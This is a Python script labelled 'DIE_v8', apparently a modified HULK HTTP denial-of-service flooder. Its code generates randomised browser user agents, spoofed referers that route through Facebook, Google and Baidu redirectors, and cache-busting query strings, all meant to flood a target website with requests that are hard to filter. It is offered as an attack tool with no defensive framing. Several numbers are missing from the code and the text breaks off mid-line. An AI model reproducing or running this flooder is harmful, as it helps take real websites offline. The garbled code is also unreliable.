#!/usr/bin/env python
#coding: utf-8
#..:: > DIE_v8 < ::.. Mod xrc team
import random
import socket
import threading
import time
import datetime
import urllib2
import urllib
import re
import sys
import optparse
import os
import urlparse
#Hulk Mod xrc team
url=''
host=''
headers_useragents=[]
headers_referers=[]
keyword_top=[]
request_counter=0
flag=0
safe=0
def inc_counter():
 global request_counter
 request_counter+=1
def set_flag(val):
 global flag
 flag=val
 
def set_safe():
 global safe
 safe=1
def getUserAgent():
    platform = random.choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os  = random.choice(['68K', 'PPC'])
    elif platform == 'Windows':
        os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE', 'Windows 7', 'Windows 8'])
    elif platform == 'X11':
        os  = random.choice(['Linux i686', 'Linux x86_64'])
    browser = random.choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(random.randint(2000, currentYear))
        month = random.randint(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = random.randint(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(random.randint(1, 21)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(random.randint(1, 10)) + '.0'
        engine = str(random.randint(1, 5)) + '.0'
        option = random.choice([True, False])
        if option == True:
            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
def referer_list():
 global headers_referers
 headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
 headers_referers.append('http://www.google.com/?q=')
 headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
 headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
 headers_referers.append('http://www.google.com/translate?u=')
 headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
 headers_referers.append('http://help.baidu.com/searchResult?keywords=')
 headers_referers.append('http://www.bing.com/search?q=')
 headers_referers.append('https://add.my.yahoo.com/rss?url=')
 headers_referers.append('https://play.google.com/store/search?q=')
 return(headers_referers)
def keyword_list():
 global keyword_top
 keyword_top.append('Sex')
 keyword_top.append('Robin Williams')
 keyword_top.append('World Cup')
 keyword_top.append('Ca Si Le Roi')
 keyword_top.append('Ebola')
 keyword_top.append('Malaysia Airlines Flight 370')
 keyword_top.append('ALS Ice Bucket Challenge')
 keyword_top.append('Flappy Bird')
 keyword_top.append('Conchita Wurst')
 keyword_top.append('ISIS')
 keyword_top.append('Frozen')
 keyword_top.append('014 Sochi Winter Olympics')
 keyword_top.append('IPhone')
 keyword_top.append('Samsung Galaxy S5')
 keyword_top.append('Nexus 6')
 keyword_top.append('Moto G')
 keyword_top.append('Samsung Note 4')
 keyword_top.append('LG G3')
 keyword_top.append('Xbox One')
 keyword_top.append('Apple Watch')
 keyword_top.append('Nokia X')
 keyword_top.append('Ipad Air')
 keyword_top.append('Facebook')
 keyword_top.append('Anonymous')
 return(keyword_top)
def buildblock(size):
 out_str = ''
 for i in range(, size):
  a = random.randint(65, 90)
  out_str += chr(a)
 return(out_str)
def httpcall(url):
 referer_list()
 code=
 if url.count("?")>:
  param_joiner = "&"
 else:
  param_joiner = "?"
 request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 request.add_header('User-Agent', getUserAgent())
 request.add_header('Cache-Control', 'no-cache')
 request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
 request.add_header('Referer', random.choice(headers_referers) + host + buildblock(random.randint(5,10)))
 request.add_header('Keep-Alive', random.randint(110,120))
 request.add_header('Connection', 'keep-alive')
 request.add_header('Host',host)
 index = random
